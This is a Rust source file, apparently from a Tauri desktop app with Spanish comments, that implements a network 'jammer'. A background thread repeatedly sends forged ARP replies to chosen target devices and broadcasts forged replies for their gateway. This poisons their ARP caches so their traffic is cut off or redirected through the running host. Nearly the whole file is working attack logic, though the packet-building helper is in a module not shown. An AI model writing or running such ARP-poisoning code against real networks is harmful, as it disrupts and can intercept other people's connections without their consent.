// src-tauri/src/infrastructure/network/jammer_engine.rs
// Descripcion: implementacion "real" del jammer usando pnet + PacketInjector. Expuesto a application via `JammerPort`.

use crate::domain::ports::JammerPort;
use crate::domain::ports::HostIdentityPort;
use crate::infrastructure::network::packet_injector::PacketInjector;
use pnet::datalink;
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{self, Receiver, Sender};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};

const JAM_LOOP_SLEEP_MS: u64 = 350;
const IFACE_REFRESH_SECS: u64 = 15;

#[derive(Clone)]
struct Target {
    ip: String,
    mac: String,
    gateway_ip: String,
}

enum JammerCommand {
    Start(Target),
    Stop(String),
}

pub struct PnetJammerEngine {
    command_tx: Sender<JammerCommand>,
    running: Arc<AtomicBool>,
    identity: Arc<dyn HostIdentityPort>,
}

impl PnetJammerEngine {
    pub fn new(identity: Arc<dyn HostIdentityPort>) -> Self {
        let (command_tx, command_rx) = mpsc::channel::<JammerCommand>();
        let engine = Self {
            command_tx,
            running: Arc::new(AtomicBool::new(true)),
            identity,
        };
        engine.start_attack_loop(command_rx);
        engine
    }

    fn start_attack_loop(&self, command_rx: Receiver<JammerCommand>) {
        let running_clone = Arc::clone(&self.running);
        let identity = Arc::clone(&self.identity);

        thread::spawn(move || {
            let mut active_targets: HashMap<String, Target> = HashMap::new();
            let mut cached_iface: Option<datalink::NetworkInterface> = None;
            let mut next_iface_refresh = Instant::now();

            while running_clone.load(Ordering::Relaxed) {
                // Drenamos comandos pendientes sin bloquear.
                while let Ok(cmd) = command_rx.try_recv() {
                    match cmd {
                        JammerCommand::Start(target) => {
                            println!(
                                "💀 [JAMMER] Objetivo registrado: {} (gateway: {})",
                                target.ip, target.gateway_ip
                            );
                            active_targets.insert(target.ip.clone(), target);
                        }
                        JammerCommand::Stop(target_ip) => {
                            if active_targets.remove(&target_ip).is_some() {
                                println!("🏳️ [JAMMER] Objetivo eliminado: {}", target_ip);
                            }
                        }
                    }
                }

                if active_targets.is_empty() {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                }

                // Refrescamos identidad/interfaz a intervalos para evitar bloquear runtime.
                if cached_iface.is_none() || Instant::now() >= next_iface_refresh {
                    match identity.get_host_identity() {
                        Ok(identity) => {
                            let interfaces = datalink::interfaces();
                            let interface = interfaces.into_iter().find(|iface| {
                                iface.ips.iter().any(|ip| ip.ip().to_string() == identity.ip)
                            });

                            cached_iface = interface;
                            next_iface_refresh =
                                Instant::now() + Duration::from_secs(IFACE_REFRESH_SECS);
                        }
                        Err(_) => {
                            // Si falla resolucion, no bloqueamos: reintentamos en breve.
                            next_iface_refresh = Instant::now() + Duration::from_millis(1200);
                        }
                    }
                }

                let Some(iface) = cached_iface.as_ref() else {
                    thread::sleep(Duration::from_millis(500));
                    continue;
                };

                let Some(my_mac) = iface.mac else {
                    cached_iface = None;
                    thread::sleep(Duration::from_millis(500));
                    continue;
                };

                for target in active_targets.values() {
                    let Ok(target_ip) = Ipv4Addr::from_str(&target.ip) else {
                        continue;
                    };
                    let Ok(gateway_ip) = Ipv4Addr::from_str(&target.gateway_ip) else {
                        continue;
                    };

                    let target_mac = PacketInjector::parse_mac(&target.mac);
                    if target_mac == MacAddr::zero() {
                        continue;
                    }

                    // Enviamos ARP Reply falsificado al objetivo (poisoning).
                    PacketInjector::send_fake_arp(&iface, target_mac, target_ip, my_mac, gateway_ip);

                    // Segundo envio: al gateway, usando broadcast ethernet (best-effort).
                    let broadcast_mac = MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
                    PacketInjector::send_fake_arp(&iface, broadcast_mac, gateway_ip, my_mac, target_ip);
                }

                // Cadencia conservadora para no saturar el host local.
                thread::sleep(Duration::from_millis(JAM_LOOP_SLEEP_MS));
            }
        });
    }
}

impl JammerPort for PnetJammerEngine {
    fn start_jamming(&self, target_ip: String, target_mac: String, gateway_ip: String) {
        let cmd = JammerCommand::Start(Target {
            ip: target_ip.clone(),
            mac: target_mac,
            gateway_ip: gateway_ip.clone(),
        });
        if let Err(err) = self.command_tx.send(cmd) {
            eprintln!(
                "[jammer_engine] start_jamming fallo al encolar ip={} gateway_ip={} err={}",
                target_ip, gateway_ip, err
            );
        }
    }

    fn stop_jamming(&self, target_ip: String) {
        if let Err(err) = self.command_tx.send(JammerCommand::Stop(target_ip.clone())) {
            eprintln!(
                "[jammer_engine] stop_jamming fallo al encolar ip={} err={}",
                target_ip, err
            );
        }
    }
}

impl Drop for PnetJammerEngine {
    fn drop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
    }
}
